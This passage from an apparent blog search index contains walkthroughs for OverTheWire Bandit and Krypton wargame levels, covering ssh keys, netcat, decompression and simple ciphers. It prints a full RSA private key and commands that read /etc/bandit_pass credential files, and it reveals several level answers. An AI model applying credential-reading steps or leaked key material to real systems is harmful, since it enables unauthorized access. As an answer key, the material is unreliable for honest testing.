BAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----Instead of a password we get a large amount of base64 encoded data.This data is a RSA Private Key.By copy and pasting the base64 data and the surrounding ‘—–BEGIN RSA PRIVATE KEY—–’ and ‘—–END RSA PRIVATE KEY—–’ into a new file we can create a usuable ssh private key like we used in level 13 -&gt; 14It doesn’t matter what name you give the file. I named it ssh_key.Before we can use the ssh_key to login to the next level we need to change it’s permissions so that only we(the user) can read and write.bandit16@bandit:~$ chmod 600 ssh_keybandit16@bandit:~$ ssh -i ssh_key bandit17@localhostbandit17@bandit:~$Now that we are logged into bandit17 we have completed the level but we should retrieve the password to make it easier to log into bandit17 in future.All passwords are located in /etc/bandit_pass/ but you can only read the file with same name as the level you are logged into.bandit17@bandit:~$ cat /etc/bandit_pass/bandit17xLYVMN##########################" }, { "title": "Overthewire Bandit Level 15 -> 16", "url": "/posts/bandit15-16/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-13 23:37:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 15 -&gt; 16Level GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…WalkthroughLogin to the server using the password obtained from the previous level Bandit level 14 -&gt; 15.username: bandit15ssh bandit15@bandit.labs.overthewire.org -p 2220Similar to previous challenge we need to open a connection to a port on localhost, the difference this time is that we need to use encryption.Unfortunately netcat(nc) does not use encryption so we cannot use it for this challenge.There is an improved version of netcat called ncat.One of the improvements was support for SSL encryption.The usage of nc and ncat is identical, we only need to add one option to add the SSL support.Adding the --ssl option will enable the SSL encryption support.Like the previous level we open a connection to localhost on port 30001 and enter the password for the current level.bandit15@bandit:~$ ncat --ssl localhost 30001BfMYro##########################Correct!cluFn7##########################bandit15@bandit:~$ " }, { "title": "Overthewire Bandit Level 14 -> 15", "url": "/posts/bandit14-15/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-13 23:32:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 14 -&gt; 15Level GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.WalkthroughSo our challenge for this level is to send the password to port 30,000 on this machine.Since we used an ssh private key to log into this level the first thing we need to do is get the password.All passwords for the bandit series of challenges are located in /etc/bandit_pass/.The password for bandit14 is in a file names bandit14We can get the password for the current level by reading the /etc/bandit_pass/bandit14 file.bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJ##########################Now that we have the password we can move on to the next part opening a connection to port 30,000 on localhost.We can use a tool called netcat (nc) to open connections to specific ports.The way to make a connection with netcat is to write it in this format nc &lt;hostname&gt; &lt;portNumber&gt;.For this level the hostname will be localhost and the port 30000.bandit14@bandit:~$ nc localhost 30000 4wcYUJ##########################Correct!BfMYro##########################When we use netcat and open the connection to port 30000 we can type in the password.Afterwards we get a Correct! or Wrong! response depending on whether the correct password was entered." }, { "title": "Overthewire Bandit Level 13 -> 14", "url": "/posts/bandit13-14/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-13 23:28:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 13 -&gt; 14Level GoalThe password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don't get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working onWalkthroughLogin to the server using the password obtained from the previous level Bandit level 12 -&gt; 13.username: bandit13ssh bandit13@bandit.labs.overthewire.org -p 2220This time the password is located in a file that we (bandit13) do not have read access to.We have been given an an SSH key to login to next level.The key is a file sshkey.private in the home directory.bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ file sshkey.private sshkey.private: PEM RSA private keyReading the contents of the sshkey shows alot of base64 encoding.bandit13@bandit:~$ cat sshkey.private -----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgBZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6ZbThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsVObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeAJ3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzEpvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VSnXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsDo3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwheol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUflaL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrSM1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JHPKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbYiDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeDqT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==-----END RSA PRIVATE KEY-----bandit13@bandit:~$We have been using ssh with a password to access these levels but now we need to see how to use ssh with a private key.Time to look at the man pageLooking through the man page we can see an entry that mentions private key. The -i option for ssh will allow us to specify an identity (private ssh key) to use instead of a password.Here is the section of the man ssh page concerning -i option.-i identity_file Selects a file from which the identity (private key) for public key authentication is read. The default is ~/.ssh/identity for protocol version 1, and ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519 and ~/.ssh/id_rsa for protocol version 2. Identity files may also be specified on a per-host basis in the configuration file. It is possible to have multiple -i options (and multiple identities specified in configuration files). If no certificates have been explicitly specified by the CertificateFile directive, ssh will also try to load certificate information from the filename obtained by appending -cert.pub to identity filenames.So now we can use the -i option to login to the next level (bandit14).Since the level we are logged into (bandit13) and the next level (bandit14) are located onthe same server we use @localhost instead of @bandit.labs.overthewire.org as the address.bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostNow that we are logged into bandit14 we can get the password for bandit14 from /etc/bandit_pass/bandit14.Getting this password will make it easier to access bandit14 later.bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJ##########################" }, { "title": "Overthewire Bandit Level 12 -> 13", "url": "/posts/bandit12-13/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-13 23:23:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 12 -&gt; 13Level GoalThe password for the next level is stored in the file data.txt,which is a hexdump of a file that has been repeatedly compressed.For this level it may be useful to create a directory under /tmp in which you can work using mkdir.For example: mkdir /tmp/myname123.Then copy the datafile using cp, and rename it using mv (read the manpages!)WalkthroughLogin to the server using the password obtained from the previous level Bandit level 11 -&gt; 12.username: bandit11ssh bandit12@bandit.labs.overthewire.org -p 2220The data.txt file in located in the home directory when you login.Running head data.txt will let us see 10 lines of what the contentsof the file looks like.bandit12@bandit:~$ lsdata.txtbandit12@bandit:~$ head data.txt 00000000: 1f8b 0808 0650 b45e 0203 6461 7461 322e .....P.^..data2.00000010: 6269 6e00 013d 02c2 fd42 5a68 3931 4159 bin..=...BZh91AY00000020: 2653 598e 4f1c c800 001e 7fff fbf9 7fda &amp;SY.O...........00000030: 9e7f 4f76 9fcf fe7d 3fff f67d abde 5e9f ..Ov...}?..}..^.00000040: f3fe 9fbf f6f1 feee bfdf a3ff b001 3b1b ..............;.00000050: 5481 a1a0 1ea0 1a34 d0d0 001a 68d3 4683 T......4....h.F.00000060: 4680 0680 0034 1918 4c4d 190c 4000 0001 F....4..LM..@...00000070: a000 c87a 81a3 464d a8d3 43c5 1068 0346 ...z..FM..C..h.F00000080: 8343 40d0 3400 0340 66a6 8068 0cd4 f500 .C@.4..@f..h....00000090: 69ea 6800 0f50 68f2 4d00 680d 06ca 0190 i.h..Ph.M.h.....As the description said the file data.txt is a hexdump of a file.A hexdump is the hexadecimal representation of a file.Before we can work on data.txt we need create a temporary folder to act as a working directory and then copy the data.txt file into the temp folder.bandit12@bandit: mkdir /tmp/bandit_123bandit12@bandit: cp data.txt /tmp/bandit_123/bandit12@bandit: cd /tmp/bandit_123Now we can work on the file. First thing is to reverse the hexdump to obtain the original file.We use the xxd command for this.xxd normally creates a hexdump of the given input, we use the -r option to revert the hexdump back into its original state.bandit12@bandit:/tmp/bandit_123$ xxd -r data.txt data.outNow we run file on data.out to find out what type of file it is.This instance the file is a gzip compressed file.Now we rename the file from data.out to data1.gz so we can uncompressed the file using gunzip.We can use either of these commands to decompress the compressed file.gzip -d data.gz or gunzip data.gzbandit12@bandit:/tmp/bandit_123$ file data.outdata.out: gzip compressed data, was \"data2.bin\", last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/bandit_123$ mv data.out data1.gzbandit12@bandit:/tmp/bandit_123$ gunzip data1.gzAfter uncompressing the data1.gz we get a new file data1. Again we run file to see what file type we are dealing with now. It is a compressed file again this time a bzip2 file. We rename the file giving it a bzip2 extension and decompress.We use the command bzip2 -d data.bz2 to decompress the file.bandit12@bandit:/tmp/bandit_123$ lsdata1 data1.out data.txtbandit12@bandit:/tmp/bandit_123$ file data1data1: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/bandit_123$ mv data1 data2.bz2bandit12@bandit:/tmp/bandit_123$ bzip2 -d data2.bz2Running file on the newly decompressed file tells us it is another gzip file.Again we rename it adding the .gz extension and then decompress.bandit12@bandit:/tmp/bandit_123$ lsdata2 data.txtbandit12@bandit:/tmp/bandit_123$ file data2data2.out: gzip compressed data, was \"data4.bin\", last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/bandit_123$ mv data2 data3.gzbandit12@bandit:/tmp/bandit_123$ gunzip data3.gzRunning file on the new file tells us it is a POSIX tar archive POSIX tar archives use the .tar extension. Rename the file adding the .tar extension and then decompress.We use the command tar xvf data.tar to decompress the file.x for extract.v for list all files extracted.f to let the tar command know to use an input file.bandit12@bandit:/tmp/bandit_123$ lsdata3 data.txtbandit12@bandit:/tmp/bandit_123$ file data3data3: POSIX tar archive (GNU)bandit12@bandit:/tmp/bandit_123$ mv data3 data4.tarbandit12@bandit:/tmp/bandit_123$ tar xvf data4.tardata5.binThe file command tells us that data5.bin is another tar archive.Rename data5.bin giving it the .tar extension and then extract the file again with the tar commandbandit12@bandit:/tmp/bandit_123$ file data5.bindata5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/bandit_123$ mv data5.bin data5.tarbandit12@bandit:/tmp/bandit_123$ tar xvf data5.tardata6.binFile command tells us that data6.bin is another bzip2 compressed file.Rename from data6.bin to data6.bz2.Uncompress data6.bz2.bandit12@bandit:/tmp/bandit_123$ file data6.bindata6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/bandit_123$ mv data6.bin data6.bz2bandit12@bandit:/tmp/bandit_123$ bzip2 -d data6.bz2File command tells us that data6 is another tar archive.Rename from data6 to data6.tar.Uncompress data6.tar.bandit12@bandit:/tmp/bandit_123$ lsdata4.tar data5.tar data6 data.txtbandit12@bandit:/tmp/bandit_123$ file data6data6: POSIX tar archive (GNU) bandit12@bandit:/tmp/bandit_123$ mv data6 data6.tarbandit12@bandit:/tmp/bandit_123$ tar xvf data6.tardata8.binFile command tells us that data8.bin is another gzip compressed file.Rename from data8.bin to data8.gz.Uncompress data8.gz.bandit12@bandit:/tmp/bandit_123$ lsdata4.tar data5.tar data6.tar data8.bin data.txtbandit12@bandit:/tmp/bandit_123$ file data8.bindata8.bin: gzip compressed data, was \"data9.bin\", last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/bandit_123$ mv data8.bin data8.gzbandit12@bandit:/tmp/bandit_123$ gunzip data8.gzAfter all that decompressing we finally have a text file.File command tells us that data8 is a ASCII text file.Cat data8 in order to read the password.bandit12@bandit:/tmp/bandit_123$ lsdata4.tar data5.tar data6.tar data8 data.txtbandit12@bandit:/tmp/bandit_123$ file data8data8: ASCII text bandit12@bandit:/tmp/bandit_123$ cat data8 The password is 8ZjyCR##########################ExtraHaving gone through all that file, rename and extract commands, I wondered if I could improve it and create a single line command to solve this challenge.Checking the gunzip and bzip2 man pages I saw an option to output to stdout instead of creating a file.-c --stdoutThe same option for tar command is-O, --to-stdoutBy outputing the results to standard out (terminal screen) we can pipe the output of one command into the next.xxd -r data.txt | gunzip -c | bzip2 -cd | gunzip -c | tar -xO | tar -xO | bzip2 -cd | tar -xO | gunzip -cThe password is 8ZjyCR##########################" }, { "title": "Overthewire Bandit Level 11 -> 12", "url": "/posts/bandit11-12/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-13 23:10:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 11 -&gt; 12Level GoalThe password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positionsWalkthroughLogin to the server using the password obtained from the previous level Bandit level 10 -&gt; 11.username: bandit11ssh bandit11@bandit.labs.overthewire.org -p 2220The file data.txt is located in the home directory.bandit11@bandit:~$ lsdata.txt We cat the contents of the file and can see that it does not make any sense when we try to read.bandit11@bandit:~$ cat data.txtGur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHhGoing back to the description it mentions characters being rotated, this immediately bring ROT13 to mind.In a ROT13 cipher characters are rotated 13 places this meansa becomes na is 1st letter of the alphabet.Rotate 13 places 1 + 13 = 14.14th letter of alphabet is n.t becomes gt is the 20th letter of the alphabet.Rotate 13 places 20 + 13 = 33.Since 33 is greater then 26 (26 letters in alphabet) we take 26 from 33 to bring it back into the alphabet range.33 - 26 = 77th letter of the alphabet is g.Full ROT13 mappings Character ROT13 Character ROT13 Character a -&gt; n -&gt; a b -&gt; o -&gt; b c -&gt; p -&gt; c d -&gt; q -&gt; d e -&gt; r -&gt; e f -&gt; s -&gt; f g -&gt; t -&gt; g h -&gt; u -&gt; h i -&gt; v -&gt; i j -&gt; w -&gt; j k -&gt; x -&gt; k l -&gt; y -&gt; l m -&gt; z -&gt; m Now with an understanding of ROT13 we can move onto the level.We can use a linux command line tool tr (translate) to translate the rotated characters back to their original posistion.bandit11@bandit:~$ cat data.txtGur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHhbandit11@bandit:~$ cat data.txt | tr a-zA-Z n-za-mN-ZA-MThe password is 5Te8Y4##########################Or we can one of many online tools like CyberChef that have graphical interfaces to solve the ROT13 ciphertext." }, { "title": "Overthewire Bandit Level 10 -> 11", "url": "/posts/bandit10-11/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-13 22:54:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 10 -&gt; 11Level GoalThe password for the next level is stored in the file data.txt, which contains base64 encoded data.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 9 -&gt; 10.username: bandit10ssh bandit10@bandit.labs.overthewire.org -p 2220After logging in we can find the data.txt file located in the current directory.bandit10@bandit:~$ lsdata.txtRunning the file command tells us it is a text file.bandit10@bandit:~$ file data.txtdata.txt: ASCII textBut when trying to read the contents of the file it is unreadable to humans.bandit10@bandit:~$ cat data.txtVGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==As the level goal said the contents of data.txt has been encoded using base64. Linux has a command line tool for encoding and decoding base64.base64 is the command. Checking the manual page for base64 we can see how to decode data.txt.BASE64(1) User Commands BASE64(1)NAME base64 - base64 encode/decode data and print to standard outputSYNOPSIS base64 [OPTION]... [FILE]DESCRIPTION Base64 encode or decode FILE, or standard input, to standard output. With no FILE, or when FILE is -, read standard input. Mandatory arguments to long options are mandatory for short options too. -d, --decode decode dataThe -d option will allow us to decode base64 back into its original format which in this case is ASCII text.Running the following command will give the password for the next level.bandit10@bandit:~$ cat data.txt | base64 -dThe password is IFukwK##########################" }, { "title": "Overthewire Krypton Level 1 -> 2", "url": "/posts/krypton1/", "categories": "overthewire, overthewire-krypton", "tags": "overthewire, krypton", "date": "2021-11-02 23:22:00 +0000", "snippet": "Solution for the Overthewire.org Krypton level 1 -&gt; 2Level InfoThe password for level 2 is in the file krypton2.It is encrypted using a simple rotation.It is also in non-standard ciphertext format.When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries.This helps obfuscate any patterns.This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy!WalkthroughLogin to krypton1 using the password from obtained from previous level~$ ssh krypton1@krypton.labs.overthewire.org -p 2231Looking at the directory /krypton/krypton1/ we can see 2 files krypton2 and README.README contains instructions for the level.Welcome to Krypton!This game is intended to give hands on experience with cryptographyand cryptanalysis. The levels progress from classic ciphers, to modern,easy to harder.Although there are excellent public tools, like cryptool,to performthe simple analysis, we strongly encourage you to try and do thesewithout them for now. We will use them in later excercises.** Please try these levels without cryptool first **The first level is easy. The password for level 2 is in the file'krypton2'. It is 'encrypted' using a simple rotation called ROT13.It is also in non-standard ciphertext format. When using alpha characters forcipher text it is normal to group the letters into 5 letter clusters,regardless of word boundaries. This helps obfuscate any patterns.This file has kept the plain text word boundaries and carried them tothe cipher text.Enjoy!According to the README the contents of krypton2 is encrypted using a rotation cipher called ROT13.A becomes N,B becomes O, . . .Y becomes L,Z becomes M.Using the tr command we can reverse the ROT13 and get the decrypted contents of krypton2.krypton1@krypton:/krypton/krypton1$ cat krypton2YRIRY GJB CNFFJBEQ EBGGRAkrypton1@krypton:/krypton/krypton1$ cat krypton2 | tr A-Z N-ZA-MLEVEL TWO PASSWORD ROT***" }, { "title": "Overthewire Krypton Level 0 -> 1", "url": "/posts/krypton0/", "categories": "overthewire, overthewire-krypton", "tags": "overthewire, krypton", "date": "2021-11-02 23:14:00 +0000", "snippet": "Solution for the Overthewire.org Krypton level 0 -&gt; 1Level InfoWelcome to Krypton! The first level is easy. The following string encodes the password using Base64:S1JZUFRPTklTR1JFQVQ=Use this password to log in to krypton.labs.overthewire.org with username krypton1 using SSH on port 2231. You can find the files for other levels in /krypton/WalkthroughThe description tells us the password has been encoded using base64 encoding. So we only need to decode the string to obtain the password. Linux terminal has a base64 command that can be used to decode the password.~$ echo S1JZUFRPTklTR1JFQVQ= | base64 -dKRYPTON*******Use the password to login to krypton1." }, { "title": "Overthewire Bandit Level 9 -> 10", "url": "/posts/bandit10/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:59:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 9 -&gt; 10Level GoalThe password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several = characters.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 8 -&gt; 9.username: bandit9ssh bandit9@bandit.labs.overthewire.org -p 2220Based on what the level goal tells us the file data.txt we will be searching will contain a mix of data and human-readable text.The password that we will be searching for is human-readable and is preceded by several = characters.First thing first lets see what the contents of data.txt looks like.bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ cat data.txt Llω;ßOܛǤXNdT$x7@D@o+DBM֢Z/,_w#5 Ўe&amp;-ϢQ8J%fanp6l|cWW\"&amp;8fVJ$S~d pkU;ֿvAmHtɘ3ߘ(ǟE' ':uPעg&gt;'.9oc?D.\\UU,L}, )W[b;D51 cD^!`PKT5?)X爓F]2J-5|PrL{�DX7&lt;ʗE2Qk)&gt;QGnW([&gt;L[ŵ-GwJp_pTE}-��v7[d4[Eed{s5d!۫*.d CrAG1~趤b2%0`c*!`3r/ZȆڎxʟ}}$x?X7ҟjͽ黜`&amp; Q9܅J//M$a^;yzEt!pU~eϸ`Rn,IMTՁB$1,ɚџ|\\{ɘV媼G74@[tk4ӶhobXQ��O`&lt;!LVSXdKium��m\\WB|{,xvdТxIY.}м&amp;F,0fRV{l#@^SJp`EO%s~֬c}o?/r-4 GhG$========== the*2i\"4kDsxz]+aƽg|Ax*_f^[Ro+OQf3,UtGy*r\\P0Z}آIǢك,ä(I% * * *We can see alot of lines that look like gibberish (human unreadable).There is some lines of text that have multiple = in them.These are the lines we want to extract from the file.We can do this manually searching the file line by line, it will be slow.A faster method is to use strings command.The strings command will find all human-readable strings in a file.bandit9@bandit:~$ strings data.txtZ/,_WW\"&amp;82Qk)xWa_x?Xn//M$;yzEt!WpU~e`Rn,IVSXdKWB|{GhG$ * * *Now that we can find all human-readable strings we can search these lines for the = characters that we know will precede the password.To search text for a specific word or characters we can use grep command again.Running grep on the output of strings command will get the password for the next level.bandit9@bandit:~$ strings data.txt | grep ============== the*2i\"4========== passwordZ)========== is&amp;========== truKLd##########################" }, { "title": "Overthewire Bandit Level 8 -> 9", "url": "/posts/bandit09/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:55:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 8 -&gt; 9Level GoalThe password for the next level is stored in the file data.txt and is the only line of text that occurs only once.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 7 -&gt; 8.username: bandit8ssh bandit8@bandit.labs.overthewire.org -p 2220For this level we need to search all lines of text in the a file and find the single line that is unique (only occurs once) in the file.bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ cat data.txt VkBAEWyIibVkeURZV5mowiGg6i3m7Be0zdd2ctVveROGeiS2WE3TeLZMeL5jL7iMsYSokIATVvFUKU4sAHTtMarfjlZWWj5iySvsTwlMgnUF0n86Fgmn2TNjkSOlrV72NLWvtQvL7EaqBNx2x4eznRlQONULlCYZLfrBHfAh0pP9bgGAZP4QrVkut3pysAYCU0NYdD3wHZKpfEg9qGQOLJimAJy6qxhSflyKxCbHB8uLTaIB5LXqQNuJj3yj00ehTThRArdF2ZEXMO47TIYkyPPLtvzzLcDfcIPbot7oYveUPNxDMhv1hiri50CqpkTG * * *iwE0KTeKQ8PWihqvjUnpu52YZeIO8PqbqaWWAOOquC3yHnfJI4zvPWzCBdfHQ8wa0N65ZPpNGkUJePzFxctCRZRXVrCbUGfmcR6riSWC0ST7ALZ2i1e47r3gc0QxShGoTKUtQbeYnEzzYIne7BinoBx2bHFLBXzG8NtHZnWzCA8HswoJSCU7Ojg8nP3eKpsASzwgS2ADSjP6ypOzp2bIvdqNyusRtrHj5AdqWjoJOEdx5tJmZVBMo0K2e4arD3ZWgqyF9CW3NNIiGW27AtWVNPqp3i1fxTMYflyKxCbHB8uLTaIB5LXqQNuJj3yj00ehw4zUWFGTUrAAh8lNkS8gH3WK2zowBEkAbandit8@bandit:~$Printing the contents of the file to the screen we can see there is lot of lines of text and each line is made up of one password.Using wc -l we can see how many lines are in the file.bandit8@bandit:~$ wc -l data.txt 1001 data.txt1001 lines is too much to check manually.Before we can eliminate the duplicated lines we need to group them together.sort command can sort the contents of a file and print to screen.bandit8@bandit:~$ sort data.txt07KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR207KC3ukwX7kswl8Le9ebb3H3sOoNTsR20efnqHY1ZTNRu4LsDX4D73DsxIQq7RuJ0efnqHY1ZTNRu4LsDX4D73DsxIQq7RuJ0efnqHY1ZTNRu4LsDX4D73DsxIQq7RuJ0efnqHY1ZTNRu4LsDX4D73DsxIQq7RuJ0efnqHY1ZTNRu4LsDX4D73DsxIQq7RuJ * * *Now we have grouped all duplicated lines we can elimiate the doubles.uniq command will let us eliminated duplicated lines so we only see single occurences of each line.We sort the data and pipe that to uniq to remove all the doubles.bandit8@bandit:~$ sort data.txt | uniq07KC3ukwX7kswl8Le9ebb3H3sOoNTsR20efnqHY1ZTNRu4LsDX4D73DsxIQq7RuJ0N65ZPpNGkUJePzFxctCRZRXVrCbUGfm0Xo6DLyK5izRqEtBA7sW2SRmlAixWYSg10XitczY5Dz7UMoseKIeFWSzzwQrylfw1ETSsKgjfQj1cJeFzXLJWzKzza3iWcJa1T6qw9I32d71cS3TTvwmVp1WsxPFDJ9I2bFz9F0yRwxGzVCZ4Er04bk00qfUrzWb2CxmtCkpNL5ZjuoNzAtShkPXf5T43W7s337o85y4OymIh99WPUtotkb114evfAkC33xpPQhjt4Q2mqtX4sCVRwH2Zyh82E8R4SMqyZZztep75cte6xxKpVL49pKUkV8N5AdqWjoJOEdx5tJmZVBMo0K2e4arD3ZW5cO8XuoQWrzsyeOWDht8zgUIVWSRDaeC6PF22p6O8TphCTZot9ApZx8VfGuo8rd5 * * *Eventhough we have removed all doubled lines we still have not narrowed down the search to the one line that is entirely unique.The man page of uniq shows an option for unique lines.Excerpt form the man page of uniq -u, --unique only print unique linesCombining the sort and uniq -u we can get the single line of text in data.txt that is entirely unique.bandit8@bandit:~$ sort data.txt | uniq -uUsvVyF##########################" }, { "title": "Overthewire Bandit Level 7 -> 8", "url": "/posts/bandit08/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:45:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 7 -&gt; 8Level GoalThe password for the next level is stored in the file data.txt next to the word millionth.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 6 -&gt; 7.username: bandit7ssh bandit7@bandit.labs.overthewire.org -p 2220For this level we need to find the word millionth in the data.txt file and the password for level 8 is next to millionth.First thing we need to do is see what data is in data.txt.bandit7@bandit:~$ lsdata.txtbandit7@bandit:~$ cat data.txtbinning WnfnFPqkuhl2nwHBohzn2C4L5W0gwcLqabuts v8PAwDdkGDdp5NsJ7ZFM5A7TJ5MkYDbmfathead wBhCy0fqvbQdexz5kMKBtGoSWgXw7s0Hattacks 3GzwnGiZnBDdVuHivJk1pEfOOYu7uOTalopping H9hzviFp1QO4WF8EzcQNl5MDz5r1bzUCtyrannosaurus WxtYXVar4sgInHp7YUpTzOjdUw1Ww0x8reservists QDidoX6BN1MDTi0QwA6Vt82L9Rb64cm3atrophy's mSpCwP9VgcGRn1SCD8R9bb9cPBl2yqkWbolt's 726RB3lt2RmeCtbWEQ8lhUAxVBJfepy0Klondikes wVh3ILxQAsKg8WNnFHp8GxtnSu213GbR * * *Aymara zSeUS0UyD8Q6a6YPwaClRBbk1x8kFBEcwaned gL59r6xvewh5y8t0mgiNtHtCUMG8S6Idconceded TWLUptX3HbwD4qsYOQ9sENOnOiNy79sCkilned kLjrgoJvftIyUyotuOI4cxFcxQXbC6aSSantayana KKn1I4fuWdzKyvffp1aYrBDzQa3Tr3PkAntigua dRyNieqAg0OkCgrKVQFXMXS06vFArL55heyday UAGwMlFzylGa4fHpQZEelUQEZ5JlUpyXpraiseworthiness's bjRB0uGXM4dH7ip9hHB3mbFBMMwlNKNqseparatism p2167YTCJseAv4YhLZNb2fs7JivlDLUWplan PLz4ZXwX02fEe4oMd1I78wQXl4MIMxTfconfrontation KlHScgMgzyBQYxBXkxsjKcQ2A5erDIjLbriquet's aHc51xHj1t3ANF7jH26dd7mHWBfd8VKzencapsulate STOVYQEMWtFz54JtjJRrhDXgZcfVw8lSwildfowls PqcMofjmKj8NBvO9exdu7FY2NG6WUMzbFinland 